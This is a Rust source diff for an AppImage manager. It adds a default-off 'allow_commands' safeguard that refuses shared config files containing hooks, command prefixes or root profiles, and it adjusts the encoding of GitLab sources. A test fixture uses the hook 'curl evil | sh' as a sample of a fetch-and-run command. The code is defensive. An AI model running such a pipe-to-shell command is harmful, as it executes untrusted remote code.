@@ -141,7 +141,13 @@ impl Config {
 pub fn source_to_input(p: &Provider) -> String {
     match p {
         Provider::GitHub { owner, repo } => format!("https://github.com/{owner}/{repo}"),
-        Provider::GitLab { host, project } => format!("https://{host}/{project}"),
+        // Self-hosted GitLab (invent.kde.org, ...) is only recognised with the prefix.
+        Provider::GitLab { host, project }
+            if host == "gitlab.com" || host.starts_with("gitlab.") =>
+        {
+            format!("https://{host}/{project}")
+        }
+        Provider::GitLab { host, project } => format!("gitlab:https://{host}/{project}"),
         Provider::Forgejo { host, owner, repo } => format!("forgejo:https://{host}/{owner}/{repo}"),
         Provider::Url { url } => url.clone(),
         Provider::Zsync { url } => format!("zsync|{url}"),
@@ -299,6 +305,32 @@ pub struct ApplyOptions {
     pub no_install: bool,
     /// Also delete extra profiles and hooks that the file does not list.
     pub prune: bool,
+    /// Accept entries that make appOFholding run commands: hooks, command prefixes and
+    /// profiles that start the app as root. Off by default, so a file from someone else cannot
+    /// slip them in.
+    pub allow_commands: bool,
+}
+
+/// What in this entry would run commands on this machine, in words (empty when nothing does).
+pub fn commands_in(a: &AppConfig) -> Vec<String> {
+    let mut out: Vec<String> = a
+        .hooks
+        .iter()
+        .map(|(kind, cmd)| format!("{kind} hook: {cmd}"))
+        .collect();
+    for p in &a.profiles {
+        if !p.prefix.is_empty() {
+            out.push(format!(
+                "profile '{}' runs under: {}",
+                p.name,
+                p.prefix.join(" ")
+            ));
+        }
+        if p.elevated {
+            out.push(format!("profile '{}' starts the app as root", p.name));
+        }
+    }
+    out
 }
 
 impl Library {
@@ -388,6 +420,16 @@ impl Library {
                 )));
             }
             profile_from_config(p).validate()?;
+        }
+        for kind in a.hooks.keys() {
+            crate::profiles::check_kind(kind)?;
+        }
+        let commands = commands_in(a);
+        if !commands.is_empty() && !opts.allow_commands {
+            return Err(Error::Other(format!(
+                "not applied: the file asks to run commands ({}). Read them, then re-run with --allow-commands if you trust them",
+                commands.join("; ")
+            )));
         }
 
         if self.get(&a.id).is_err() {
@@ -516,6 +558,78 @@ mod tests {
     }
 
     #[test]
+    fn commands_in_a_file_are_refused_unless_allowed() {
+        let tmp = tempfile::tempdir().unwrap();
+        let lib =
+            Library::open(Dirs::with_root(tmp.path()), tmp.path().join("appofholding")).unwrap();
+        let p = tmp.path().join("Foo.AppImage");
+        std::fs::write(&p, fixture::simple_appimage("Foo App", None)).unwrap();
+        lib.add(&p, &crate::library::AddOptions::default()).unwrap();
+        let cfg = Config::parse(
+            "version = 1\n[[app]]\nid = \"foo-app\"\n[app.hooks]\npost-update = \"curl evil | sh\"\n",
+        )
+        .unwrap();
+        let notes = lib.apply_config(&FakeHttp::default(), &cfg, &ApplyOptions::default());
+        assert!(
+            matches!(&notes[..], [Note::Failed { error, .. }] if error.contains("--allow-commands") && error.contains("curl evil")),
+            "{notes:?}"
+        );
+        assert!(
+            lib.hooks("foo-app").unwrap().is_empty(),
+            "nothing was written"
+        );
+
+        // A typo in a hook name is caught before anything is changed.
+        let bad = Config::parse(
+            "version = 1\n[[app]]\nid = \"foo-app\"\npolicy = \"manual\"\n[app.hooks]\npost-updat = \"true\"\n",
+        )
+        .unwrap();
+        let opts = ApplyOptions {
+            allow_commands: true,
+            ..Default::default()
+        };
+        let notes = lib.apply_config(&FakeHttp::default(), &bad, &opts);
+        assert!(matches!(&notes[..], [Note::Failed { .. }]), "{notes:?}");
+
+        let notes = lib.apply_config(&FakeHttp::default(), &cfg, &opts);
+        assert!(matches!(&notes[..], [Note::Configured(_)]), "{notes:?}");
+        assert_eq!(lib.hooks("foo-app").unwrap().len(), 1);
+    }
+
+    #[test]
+    fn every_kind_of_source_survives_export_and_apply() {
+        let providers = [
+            Provider::GitHub {
+                owner: "o".into(),
+                repo: "r".into(),
+            },
+            Provider::GitLab {
+                host: "gitlab.com".into(),
+                project: "g/p".into(),
+            },
+            Provider::GitLab {
+                host: "invent.kde.org".into(),
+                project: "g/p".into(),
+            },
+            Provider::Forgejo {
+                host: "codeberg.org".into(),
+                owner: "o".into(),
+                repo: "r".into(),
+            },
+            Provider::Url {
+                url: "https://www.vendor.com/dl?os=linux".into(),
+            },
+            Provider::Zsync {
+                url: "https://x.org/Foo.AppImage.zsync".into(),
+            },
+        ];
+        for p in providers {
+            let back = crate::source::parse_input(&source_to_input(&p)).unwrap();
+            assert_eq!(back.source.provider, p);
+        }
+    }
+
+    #[test]
     fn export_is_portable_readable_and_round_trips_through_toml() {
         let (tmp, lib) = lib();
         set_up(tmp.path(), &lib);
@@ -562,7 +676,14 @@ mod tests {
             .json("https://api.github.com/repos/o/foo/releases/latest", &rel)
             .bytes("https://dl/foo", img);
         let cfg = Config::parse(&text).unwrap();
-        let notes = fresh.apply_config(&http, &cfg, &ApplyOptions::default());
+        let notes = fresh.apply_config(
+            &http,
+            &cfg,
+            &ApplyOptions {
+                allow_commands: true,
+                ..Default::default()
+            },
+        );
         assert_eq!(
             notes,
             vec![
@@ -587,7 +708,14 @@ mod tests {
 
         // Applying again changes nothing and downloads nothing.
         let before = http.requests.lock().unwrap().len();
-        let notes = fresh.apply_config(&http, &cfg, &ApplyOptions::default());
+        let notes = fresh.apply_config(
+            &http,
+            &cfg,
+            &ApplyOptions {
+                allow_commands: true,
+                ..Default::default()
+            },
+        );
         assert_eq!(notes, vec![Note::Configured("foo-app".into())]);
         assert_eq!(http.requests.lock().unwrap().len(), before);
         assert_eq!(fresh.export_config().unwrap(), again);
@@ -605,6 +733,7 @@ mod tests {
             &cfg,
             &ApplyOptions {
                 no_install: true,
+                allow_commands: true,
                 ..Default::default()
             },
         );
@@ -617,7 +746,14 @@ mod tests {
             "{notes:?}"
         );
         // A download failure is a Failed note for that app only.
-        let notes = lib.apply_config(&FakeHttp::default(), &cfg, &ApplyOptions::default());
+        let notes = lib.apply_config(
+            &FakeHttp::default(),
+            &cfg,
+            &ApplyOptions {
+                allow_commands: true,
+                ..Default::default()
+            },
+        );
         assert!(
             matches!(&notes[1], Note::Failed { id, .. } if id == "other"),
             "{notes:?}"
@@ -651,7 +787,14 @@ mod tests {
             "version = 1\n[[app]]\nid = \"foo-app\"\npolicy = \"pinned\"\n[app.sandbox]\nlevel = \"paranoid\"\n",
         )
         .unwrap();
-        let notes = lib.apply_config(&FakeHttp::default(), &cfg, &ApplyOptions::default());
+        let notes = lib.apply_config(
+            &FakeHttp::default(),
+            &cfg,
+            &ApplyOptions {
+                allow_commands: true,
+                ..Default::default()
+            },
+        );
         assert!(
             matches!(&notes[0], Note::Failed { error, .. } if error.contains("paranoid")),
             "{notes:?}"
@@ -672,7 +815,14 @@ mod tests {
         )
         .unwrap();
         // Without --prune, extras stay.
-        lib.apply_config(&FakeHttp::default(), &cfg, &ApplyOptions::default());
+        lib.apply_config(
+            &FakeHttp::default(),
+            &cfg,
+            &ApplyOptions {
+                allow_commands: true,
+                ..Default::default()
+            },
+        );
         assert_eq!(lib.profiles("foo-app").unwrap().len(), 2);
         assert_eq!(lib.hooks("foo-app").unwrap().len(), 1);
         assert!(lib.sandbox_settings("foo-app").unwrap().enabled());
@@ -681,6 +831,7 @@ mod tests {
             &cfg,
             &ApplyOptions {
                 prune: true,
+                allow_commands: true,
                 ..Default::default()
             },
         );
@@ -701,7 +852,10 @@ mod tests {
         let notes = lib.apply_config(
             &FakeHttp::default(),
             &Config::parse(&text).unwrap(),
-            &ApplyOptions::default(),
+            &ApplyOptions {
+                allow_commands: true,
+                ..Default::default()
+            },
         );
         assert_eq!(notes[0], Note::Added("bar".into()));
         assert_eq!(lib.get("bar").unwrap().id, "bar");
